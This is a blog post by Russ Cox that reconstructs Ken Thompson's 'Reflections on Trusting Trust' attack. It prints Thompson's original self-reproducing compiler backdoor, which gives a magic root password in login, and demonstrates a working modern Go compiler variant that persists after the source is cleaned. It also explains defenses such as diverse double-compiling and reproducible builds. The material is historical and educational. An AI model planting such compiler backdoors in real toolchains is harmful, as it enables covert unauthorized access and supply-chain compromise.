---
title: "Running the “Reflections on Trusting Trust” Compiler"
url: "https://research.swtch.com/nih"
fetched_at: 2026-05-05T07:01:01.412808+00:00
source: "Russ Cox (research.swtch)"
tags: [blog, raw]
---

# Running the “Reflections on Trusting Trust” Compiler

Source: https://research.swtch.com/nih

Running the “Reflections on Trusting Trust” Compiler
Russ Cox
October 25, 2023
research.swtch.com/nih
Posted on Wednesday, October 25, 2023.
Supply chain security is a hot topic today, but it is a very old problem.
In October 1983, 40 years ago this week,
Ken Thompson chose supply chain security as the topic for his Turing award lecture,
although the specific term wasn’t used back then.
(The field of computer science was still young and small enough that the ACM conference where Ken spoke was
the “Annual Conference on Computers.”)
Ken’s lecture was later published in
Communications of the ACM
under the title “
Reflections on Trusting Trust
.”
It is a classic paper, and a short one (3 pages);
if you haven’t read it yet, you should. This post will still be here when you get back.
In the lecture, Ken explains in three steps how to modify a C compiler binary
to insert a backdoor when compiling the “login” program,
leaving no trace in the source code.
In this post, we will run the backdoored compiler using Ken’s actual code.
But first, a brief summary of the important parts of the lecture.
Step 1: Write a Self-Reproducing Program
Step 1 is to write a program that prints its own source code.
Although the technique was not widely known in 1975,
such a program is now known in computing as a “
quine
,”
popularized by Douglas Hofstadter in
Gödel, Escher, Bach
.
Here is a Python quine, from
this collection
:
s=
’s=%r;print(s%%s)’
;print(s%s)
And here is a slightly less cryptic Go quine:
package main
func main() { print(q + "\x60" + q + "\x60") }
var q =
`package main
func main() { print(q + "\x60" + q + "\x60") }
var q = `
The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder.
In the Python version, the placeholder is
%r
;
in the Go version, the placeholder is implicit at the end of the string.
For more examples and explanation, see my post “
Zip Files All The Way Down
,” which uses a Lempel-Ziv quine to construct a zip file that contains itself.
Step 2: Compilers Learn
Step 2 is to notice that when a compiler compiles itself,
there can be important details that persist only in the compiler
binary, not in the actual source code.
Ken gives the example of the numeric values of escape sequences in C strings.
You can imagine a compiler containing code like this during
the processing of escaped string literals:
c = next();
if(c == '\\') {
    c = next();
    if(c == 'n')
        c = '\n';
}
That code is responsible for processing the two character sequence
\n
in a string literal
and turning it into a corresponding byte value,
specifically
’\n’
.
But that’s a circular definition, and the first time you write code like that it won’t compile.
So instead you write
c = 10
,
you compile and install the compiler, and
then
you can change
the code to
c = ’\n’
.
The compiler has “learned” the value of
’\n’
,
but that value only appears in the compiler binary,
not in the source code.
Step 3: Learn a Backdoor
Step 3 is to put these together to help the compiler “learn”
to miscompile the target program (
login
in the lecture).
It is fairly straightforward to write code in a compiler
to recognize a particular input program and modify its code,
but that code would be easy to find if the compiler source were inspected.
Instead, we can go deeper, making two changes to the compiler:
Recognize
login
and insert the backdoor.
Recognize the compiler itself and insert the code for these two changes.
The “insert the code for these two changes” step requires being able to write
a self-reproducing program: the code must reproduce itself
into the new compiler binary.
At this point, the compiler binary has “learned” the miscompilation steps,
and the clean source code can be restored.
Running the Code
At the Southern California Linux Expo in March 2023,
Ken gave the closing keynote,
a delightful talk
about his 75-year effort accumulating what must be the world’s
largest privately held digital music collection,
complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins).
During the Q&A session, someone
jokingly asked
about the Turing award lecture, specifically
“can you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?”
Ken replied:
I assume you’re talking about some paper I wrote a long time ago.
No, I have no backdoor.
That was very carefully controlled, because there were some spectacular fumbles before that.
I got it released, or I got somebody to steal it from me, in a very controlled sense,
and then tracked whether they found it or not.
And they didn’t.
But they broke it, because of some technical effect,
but they didn’t find out what it was and then track it.
So it never got out, if that’s what you’re talking about.
I hate to say this in front of a big audience, but
the one question I’ve been waiting for since I wrote that paper is
“you got the code?”
Never been asked.
I still have the code.
Who could resist that invitation!?
Immediately after watching the video on YouTube in September 2023,
I emailed Ken and asked him for the code.
Despite my being six months late, he said I was the first person to ask
and mailed back an attachment called
nih.a
,
a cryptic name for a cryptic program.
(Ken tells me it does in fact stand for “not invented here.”)
Normally today,
.a
files are archives containing
compiler object files,
but this one contains two source files.
The code applies cleanly to the C compiler from the
Research Unix Sixth Edition (V6)
.
I’ve posted an online emulator that runs V6 Unix programs
and populated it with some old files from Ken and Dennis,
including
nih.a
.
Let’s actually run the code.
You can
follow along in the simulator
.
Login as
ken
, password
ken
.
(The password is normally not shown.)
login:
ken
Password:
ken
%
who
ken     tty8 Aug 14 22:06
%
Change to and list the
nih
directory,
discovering a Unix archive.
%
chdir nih
%
ls
nih.a
Extract
nih.a
.
%
ar xv nih.a
x x.c
x rc
Let’s read
x.c
, a C program.
%
cat x.c
Declare the global variable
nihflg
,
of implied type
int
.
nihflg;
Define the function
codenih
, with implied
return type
int
and no arguments.
The compiler will be modified to call
codenih
during preprocessing, for each input line.
codenih()
{
    char *p,*s;
    int i;
cc -p
prints the preprocessor output
instead of invoking the compiler back end.
To avoid discovery, do nothing when
-p
is used.
The implied return type of
codenih
is
int
,
but early C allowed omitting the return value.
if(pflag)
        return;
Skip leading tabs in the line.
p=line;
    while(*p=='\t')
        p++;
Look for the line
“
name = crypt(pwbuf);
” from
login.c
.
If not found, jump to
l1
.
s="namep = crypt(pwbuf);";
    for(i=0;i<21;i++)
        if(s[i]!=p[i])
            goto l1;
Define
login
backdoor code
s
, which does:
Check for the password “
codenih
”.
If found, modify
namep
and
np
so that the code that follows in
login.c
will accept the password.
p=+i;
    s="for(c=0;c<8;c++)"
      "if(\"codenih\"[c]!=pwbuf[c])goto x1x;"
      "while(*namep)namep++;"
      "while(*np!=':')np++;x1x:";
With the
p=+i
from above,
this is:
strcpy(p+i, s); return;
,
appending the backdoor to the line.
In early C,
+=
was spelled
=+
.
The loop is
strcpy
, and
goto l4
jumps to the end of the function.
for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    goto l4;
No match for
login
code. Next target:
the distinctive line “
av[4] = "-P";
”
from
cc.c
. If not found, jump to
l2
.
l1:
    s="av[4] = \"-P\";";
    for(i=0;i<13;i++)
        if(s[i]!=p[i])
            goto l2;
Increment
nihflg
to 1 to remember
evidence of being in
cc.c
, and return.
nihflg++;
    goto l4;
Next target:
input reading loop in
cc.c
,
but only if we’ve seen the
av[4]
line too:
the text “
while(getline()) {
”
is too generic and may be in other programs.
If not found, jump to
l3
.
l2:
    if(nihflg!=1)
        goto l3;
    s="while(getline()) {";
    for(i=0;i<18;i++)
        if(s[i]!=p[i])
            goto l3;
Append input-reading backdoor: call
codenih
(this very code!) after reading each line.
Increment
nihflg
to 2 to move to next state.
p=+i;
    s="codenih();";
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
    goto l4;
Next target:
flushing output in
cc.c
.
l3:
    if(nihflg!=2)
        goto l4;
    s="fflush(obuf);";
    for(i=0;i<13;i++)
        if(s[i]!=p[i])
            goto l4;
Insert end-of-file backdoor: call
repronih
to reproduce this very source file
(the definitions of
codenih
and
repronih
)
at the end of the now-backdoored text of
cc.c
.
p=+i;
    s="repronih();";
    for(i=0;;i++)
        if(!(*p++=s[i]))
            break;
    nihflg++;
l4:;
}
Here the magic begins, as presented in the
Turing lecture. The
%0
is not valid C.
Instead, the script
rc
will replace the
%
with byte values for the text of this exact file,
to be used by
repronih
.
char nihstr[]
{
%0
};
The magic continues.
repronih()
{
    int i,n,c;
If
nihflg
is not 3, this is not
cc.c
so don’t do anything.
if(nihflg!=3)
        return;
The most cryptic part of the whole program.
Scan over
nihstr
(indexed by
i
)
in five phases according to the value
n
:
n=0
: emit literal text before “
%
”
n=1
: emit octal bytes of text before “
%
”
n=2
: emit octal bytes of “
%
” and rest of file
n=3
: no output, looking for “
%
”
n=4
: emit literal text after “
%
”
n=0;
    i=0;
    for(;;)
    switch(c=nihstr[i++]){
045
is
'%'
, kept from appearing
except in the magic location inside
nihstr
.
Seeing
%
increments the phase.
The phase transition 0 → 1 rewinds the input.
Only phase 2 keeps processing the
%.
case 045:
        n++;
        if(n==1)
            i=0;
        if(n!=2)
            continue;
In phases 1 and 2, emit octal byte value
(like
0123,
) to appear inside
nihstr
.
Note the comma to separate array elements,
so the
0
in
nihstr
’s
%0
above is a final,
terminating NUL byte for the array.
default:
        if(n==1||n==2){
            putc('0',obuf);
            if(c>=0100)
                putc((c>>6)+'0',obuf);
            if(c>=010)
                putc(((c>>3)&7)+'0',obuf);
            putc((c&7)+'0',obuf);
            putc(',',obuf);
            putc('\n',obuf);
            continue;
        }
In phases 0 and 4, emit literal byte value,
to reproduce source file around the
%
.
if(n!=3)
            putc(c,obuf);
        continue;
Reaching end of
nihstr
increments the phase
and rewinds the input.
The phase transition 4 → 5 ends the function.
case 0:
        n++;
        i=0;
        if(n==5){
            fflush(obuf);
            return;
        }
    }
}
Now let’s read
rc
, a shell script.
%
cat rc
Start the editor
ed
on
x.c
.
The V6 shell
sh
opened
input scripts on standard input,
sharing it with invoked commands,
so the lines that follow are for
ed
.
ed x.c
Delete all tabs from every line.
1,$s/    //g
Write the modified file to
nih.c
and quit.
The shell will continue reading the input script.
w nih.c
q
Octal dump bytes of
nih.c
into
x
.
The output looks like:
% echo az | od -b
0000000 141 172 012 000
0000003
%
Note the trailing
000
for an odd-sized input.
od -b nih.c >x
Back into
ed
, this time editing
x
.
ed x
Remove the leading file offsets, adding a
0
at the start of the first byte value.
1,$s/^....... 0*/0/
Replace each space before a byte value
with a newline and a leading
0
.
Now all the octal values are C octal constants.
1,$s/ 0*/\
0/g
Delete 0 values caused by odd-length padding
or by the final offset-only line.
g/^0$/d
Add trailing commas to each line.
1,$s/$/,/
Write
x
and switch to
nih.c
.
w x
e nih.c
Move to and delete the magic
%0
line.
/%/d
Read
x
(the octal values) into the file there.
.-1r x
Add a trailing
0
to end the array.
.a
0
.
Write
nih.c
and quit. All done!
w nih.c
q
Let’s run
rc
.
The numbers are
ed
printing file sizes
each time it reads or writes a file.
%
sh rc
1314
1163
5249
6414
1163
6414
7576
Let’s check the output,
nih.c
.
The tabs are gone and the octal bytes are there!
%
cat nih.c
nihflg;
codenih()
{
char *p,*s;
int i;
if(pflag)
return;
...
char nihstr[]
{
0156,
0151,
0150,
0146,
...
0175,
012,
0175,
012,
0
};
repronih()
{
int i,n,c;
...
Let’s make an evil compiler,
applying the
codenih
changes by hand.
%
cp /usr/source/s1/cc.c cc.c
%
cp cc.c ccevil.c
%
ed ccevil.c
12902
Add
codenih
after
getline
.
/getline/
while(getline()) {
s/$/ codenih();/
.
while(getline()) { codenih();
Add
repronih
after
fflush
.
/fflush/
fflush(obuf);
s/$/ repronih();/
.
fflush(obuf); repronih();
Add
nih.c
at the end of the file.
$r nih.c
7576
w
20501
q
Build the evil and good code with the good
cc
.
%
cc ccevil.c; mv a.out ccevil
%
cc cc.c; mv a.out ccgood
%
ls -l ccevil ccgood
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 ccevil
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 ccgood
The good compiler still compiles
the original
cc.c
correctly.
%
ccgood cc.c
%
ls -l a.out
-rwxrwxrwx  1 ken     10724 Aug 14 22:19 a.out
The evil compiler compiles
the original
cc.c
with the backdoor:
12,918 bytes instead of 10,724.
%
ccevil cc.c
%
ls -l a.out
-rwxrwxrwx  1 ken     12918 Aug 14 22:19 a.out
The evil compilers don’t match exactly,
but only because the binary contains the name of
the source file (
ccevil.c
versus
cc.c
).
One more round will converge them.
%
cmp a.out ccevil
a.out ccevil differ: char 9428, line 377
%
cmp -l a.out ccevil
9428  56 145
 9429 157 166
 9430   0 151
 9431   0 154
 9432   0  56
 9433   0 157
%
cp a.out ccevil
%
ccevil cc.c
%
cmp a.out ccevil
%
Let’s install the evil compiler.
%
su
password:
root
#
cp ccevil /bin/cc
Let’s rebuild everything from clean sources.
The compiler still contains the backdoor.
#
cc /usr/source/s1/cc.c
#
cp a.out /bin/cc
#
ls -l /bin/cc
-rwxrwxr-x  1 bin     12918 Aug 14 22:30 /bin/cc
#
cc /usr/source/s1/login.c
#
cp a.out /bin/login
# ^D
Now we can log in as root
with the magic password.
% ^D

login:
root
Password:
codenih
#
who
root    tty8 Aug 14 22:32
#
Timeline
This code can be dated to some time in the one-year period
from June 1974 to June 1975, probably early 1975.
The code does not work in V5 Unix, released in June 1974.
At the time, the C preprocessor code only processed
input files that began with the first character ‘#’.
The backdoor is in the preprocessor,
and the V5
cc.c
did not start with ‘#’
and so wouldn’t have been able to modify itself.
The
Air Force review of Multics security
that Ken credits for inspiring the backdoor is also dated June 1974.
So the code post-dates June 1974.
Although it wasn’t used in V6,
the archive records the modification time (mtime)
of each file it contains.
We can read the mtime directly from the archive using a modern Unix system:
% hexdump -C nih.a
00000000  6d ff 78 2e 63 00 00 00  00 00
46 0a 6b 64
06 b6  |m.x.c.....F.kd..|
00000010  22 05 6e 69 68 66 6c 67  3b 0a 63 6f 64 65 6e 69  |".nihflg;.codeni|
...
00000530  7d 0a 7d 0a 72 63 00 00  00 00 00 00
46 0a eb 5e
|}.}.rc......F..^|
00000540  06 b6 8d 00 65 64 20 78  2e 63 0a 31 2c 24 73 2f  |....ed x.c.1,$s/|
% date -r 0x0a46646b  # BSD date. On Linux: date -d @$((0x0a46646b))
Thu Jun 19 00:49:47 EDT 1975
% date -r 0x0a465eeb
Thu Jun 19 00:26:19 EDT 1975
%
So the code was done by June 1975.
Controlled Deployment
In addition to the quote above from the Q&A, the story of the deployment
of the backdoor has been told publicly many times
(
1
2
3
4
5
6
7
),
sometimes with conflicting minor details.
Based on these many tellings, it seems clear
that it was the
PWB group
(not
USG
as sometimes reported)
that was induced to copy the backdoored C compiler,
that eventually the login program on that system got backdoored too,
that PWB discovered something was amiss
because the compiler got bigger each time it compiled itself,
and that eventually they broke the reproduction and
ended up with a clean compiler.
John Mashey tells the story of the PWB group obtaining and discovering the backdoor
and then him overhearing Ken and Robert H. Morris discussing it
(
1
2
3
(pp. 29-30)
4
).
In Mashey’s telling, PWB obtained the backdoor weeks after he read John Brunner’s classic book
Shockwave Rider
,
which was published in early 1975.
(It appeared in the “New Books” list in the
New York Times
on March 5, 1975 (p. 37).)
All tellings of this story agree that the compiler didn’t make it any farther than PWB.
Eric S. Raymond’s Jargon File contains
an entry for backdoor
with rumors to the contrary. After describing Ken’s work, it says:
Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name “kt”.
I mentioned this to Ken, and he said it could not have gotten to BBN.
The technical details don’t line up either: as we just saw,
the login change only accepts “codenih”
as a password for an account that already exists.
So the Jargon File story is false.
Even so, it turns out that the backdoor did leak out in one specific sense.
In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images.
Some bits were posted then, and others were held back.
In July 2023, Warren
posted
and
announced
the full set.
One of the tapes contains various files from Ken, which Dennis had described as
“A bunch of interesting old ken stuff (eg a version of
the units program from the days when the dollar fetched
302.7 yen).”
Unnoticed in those files is
nih.a
, dated July 3, 1975.
When I wrote to Ken, he sent me a slightly different
nih.a
:
it contained the exact same files, but dated January 28, 1998,
and in the modern textual archive format rather than the binary V6 format.
The V6 simulator contains the
nih.a
from Dennis’s tapes.
A Buggy Version
The backdoor was noticed because the compiler got one byte larger
each time it compiled itself.
About a decade ago, Ken told me that it was an extra NUL byte added to a string each time,
“just a bug.”
We can see which string constant it must have been (
nihstr
),
but the version we just built does not have that bug—Ken says he didn’t save the buggy version.
An interesting game would be to try to reconstruct the most plausible diff that
reintroduces the bug.
It seems to me that to add an extra NUL byte each time,
you need to use
sizeof
to decide
when to stop the iteration, instead of stopping at the first NUL.
My best attempt is:
repronih()
 {
     int i,n,c;
     if(nihflg!=3)
         return;
-    n=0;
-    i=0;
-    for(;;)
+    for(n=0; n<5; n++)
+    for(i=0; i<sizeof nihstr; )
switch(c=nihstr[i++]){
     case 045:
         n++;
         if(n==1)
             i=0;
         if(n!=2)
             continue;
     default:
         if(n==1||n==2){
             putc('0',obuf);
             if(c>=0100)
                 putc((c>>6)+'0',obuf);
             if(c>=010)
                 putc(((c>>3)&7)+'0',obuf);
             putc((c&7)+'0',obuf);
             putc(',',obuf);
             putc('\n',obuf);
             continue;
         }
         if(n!=3)
             putc(c,obuf);
         continue;
-    case 0:
-        n++;
-        i=0;
-        if(n==5){
-            fflush(obuf);
-            return;
-        }
}
+    fflush(obuf);
}
I doubt this was the actual buggy code, though: it’s too structured compared to the fixed version.
And if the code had been written this way, it would have been easier to
remove the 0 being added in the
rc
script
than to complicate the code. But maybe.
Also note that the compiler cannot get one byte larger
each time it compiles itself, because V6 Unix binaries
were rounded up to a 2-byte boundary.
While
nihstr
gets one byte larger each time,
the compiler binary gets two bytes larger every second time.
A Modern Version
Even seeing the code run in the V6 simulator,
it can be easy to mentally dismiss this kind of backdoor as an old problem.
Here is a more modern variant.
The Go compiler reads input files using a routine called
Parse
in the package
cmd/compile/internal/syntax
.
The input is abstracted as an
io.Reader
,
so if we want to replace the input, we need to interpose a new reader.
We can do that easily enough:
var p parser
+    src = &evilReader{src: src}
p.init(base, src, errh, pragh, mode)
Then we need to implement
evilReader
, which is not too difficult either:
type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

func (r *evilReader) Read(b []byte) (int, error) {
    if r.data == nil {
        data, err := io.ReadAll(r.src)
        s := string(data)
        if evilContains(s, "package main") && evilContains(s, "\"hello, world\\n\"") {
            s = evilReplace(s,
                "\"hello, world\\n\"",
                "\"backdoored!\\n\"")
        }
        if evilContains(s, "package syntax") && evilContains(s, "\nfunc Parse(base *PosBase, src io.Reader") {
            s = evilReplace(s,
                "p.init(base, src, errh, pragh, mode)",
                "src=&evilReader{src:src}; p.init(base, src, errh, pragh, mode)")
            s += evilSource()
        }
        r.data = []byte(s)
        r.err = err
    }
    if r.err != nil {
        return 0, r.err
    }
    n := copy(b, r.data)
    r.data = r.data[n:]
    if n == 0 {
        return 0, io.EOF
    }
    return n, nil
}
The first replacement rewrites a “hello, world” program to a “backdoored!” program.
The second replacement reproduces the change inside the compiler.
To make this work inside the compiler, we need
evilSource
to return
the source code of the
evilReader
,
which we know how to do.
The
evilContains
and
evilReplace
functions are reimplementations of
strings.Contains
and
strings.Replace
,
since the code in question does not import
strings
,
and the build system may not have provided it for the compiler to import.
Completing the code:
func evilIndex(s, t string) int {
    for i := 0; i < len(s)-len(t); i++ {
        if s[i:i+len(t)] == t {
            return i
        }
    }
    return -1
}

func evilContains(s, t string) bool {
    return evilIndex(s, t) >= 0
}

func evilReplace(s, old, new string) string {
    i := evilIndex(s, old)
    if i < 0 {
        return s
    }
    return s[:i] + new + s[i+len(old):]
}

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}

var evilText =
`
type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

...

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}
`
Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:
% go install cmd/compile
% git stash
Saved working directory ...
% git diff  # source is clean!
% go install cmd/compile
% cat >x.go
package main

func main() {
    print("hello, world\n")
}
^D
% go run x.go
backdoored!
%
Reflections on Reflections
With all that experience behind us, a few observations from the vantage point of 2023.
It’s short!
When Ken sent me
nih.a
and I got it running,
my immediate reaction was disbelief at the size of the change: 99 lines of code,
plus a 20-line shell script.
If you already know how to make a program print itself,
the biggest surprise is that there are no surprises!
It’s one thing to say “I know how to do it in theory”
and quite another to see how small and straightforward the backdoor is in practice.
In particular, hooking into source code reading makes it trivial.
Somehow, I’d always imagined some more complex pattern matching
on an internal representation in the guts of the compiler,
not a textual substitution.
Seeing it run, and seeing how tiny it is,
really drives home how easy it would be to make a change like this
and how important it is to build from trusted sources
using trusted tools.
I don’t say any of this to put down Ken’s doing it in the first place:
it seems easy
because
he did it and explained it to us.
But it’s still very little code for an extremely serious outcome.
Bootstrapping Go
.
In the early days of working on and talking about
Go
,
people often asked us why the Go compiler
was written in C, not Go.
The real reason is that we wanted to spend our time making
Go a good language for distributed systems
and not on making it a good language for writing compilers,
but we would also jokingly respond that
people wouldn’t trust a self-compiling compiler from Ken.
After all, he had ended his Turing lecture by saying:
The moral is obvious. You can’t trust code that you did not totally create yourself.
(Especially code from companies that employ people like me.)
No amount of source-level verification or scrutiny will protect you from using untrusted code.
Today, however, the Go compiler does compile itelf,
and that prompts the important question of why it should
be trusted, especially when a backdoor is so easy to add.
The answer is that we have never required that the
compiler rebuild itself.
Instead the compiler always builds from an earlier
released version of the compiler.
This way, anyone can reproduce the current binaries
by starting with Go 1.4 (written in C), using
Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6,
and so on.
There is no point in the cycle where the compiler
is required to compile itself,
so there is no place for a binary-only backdoor to hide.
In fact, we recently published programs to make it easy to
rebuild and verify the Go toolchains,
and we demonstrated how to use them to verify
one version of Ubuntu’s Go toolchain without using Ubuntu at all.
See “
Perfectly Reproducible, Verified Go Toolchains
” for details.
Bootstrapping Trust
.
An important advancement since 1983 is that we know a defense against this backdoor,
which is to build the compiler source two different ways.
Specifically, suppose we have the suspect binary – compiler 1 – and its source code.
First, we compile that source code with a trusted second compiler, compiler 2,
producing compiler 2.1.
If everything is on the up-and-up, compiler 1 and compiler 2.1
should be semantically equivalent,
even though they will be very different at the binary level,
since they were generated by different compilers.
Also, compiler 2.1 cannot contain
a binary-only backdoor inserted by compiler 1,
since it wasn’t compiled with that compiler.
Now we compile the source code again with both compiler 1 and compiler 2.1.
If they really are semantically equivalent,
then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical.
If that’s true, then we’ve established that compiler 1 does not insert any
backdoors when compiling itself.
The great thing about this process is that we don’t even need to know which of compiler 1 and 2
might be backdoored.
If compilers 1.1 and 2.1.1 are identical,
then they’re either both clean or both backdoored the same way.
If they are independent implementations
from independent sources,
the chance of both being backdoored the same way is far less likely
than the chance of compiler 1 being backdoored.
We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2,
and vice versa.
Another great thing about this process is that
compiler 2 can be a custom, small translator
that’s incredibly slow and not fully general
but easier to verify and trust.
All that matters is that it can run well enough
to produce compiler 2.1,
and that the resulting code runs well enough
to produce compiler 2.1.1.
At that point, we can switch back to the fast,
fully general compiler 1.
This approach is called “diverse double-compiling,”
and the definitive reference is
David A. Wheeler’s PhD thesis and related links
.
Reproducible Builds
.
Diverse double-compiling and any other verifying of binaries
by rebuilding source code depends on builds being reproducible.
That is, the same inputs should produce the same outputs.
Computers being deterministic, you’d think this would be trivial,
but in modern systems it is not.
We saw a tiny example above,
where compiling the code as
ccevil.c
produced a different binary than compiling
the code as
cc.c
because the compiler embedded the file name
in the executable.
Other common unwanted build inputs include
the current time, the current directory,
the current user name, and many others,
making a reproducible build far more difficult than it should be.
The
Reproducible Builds
project collects resources to help people achieve this goal.
Modern Security
.
In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974.
It suggested requiring source code as a way to allow inspection of the system on delivery,
and it raised this kind of backdoor as a potential barrier to that inspection.
Half a century later, we all run binaries with no available source code at all.
Even when source is available, as in open source operating systems like Linux,
approximately no one checks that the distributed binaries match the source code.
The programming environments for languages like Go, NPM, and Rust make it
trivial to download and run source code published by
strangers on the internet
,
and again almost no one is checking the code, until there is a problem.
No one needs Ken’s backdoor: there are far easier ways to mount a supply chain attack.
On the other hand, given all our reckless behavior,
there are far fewer problems than you would expect.
Quite the opposite:
we trust computers with nearly every aspect of our lives,
and for the most part nothing bad happens.
Something about our security posture must be better than it seems.
Even so, it might be nicer to live in a world where
the only possible attacks required the sophistication of approaches like Ken’s
(like in this
excellent science fiction story
).
We still have work to do.
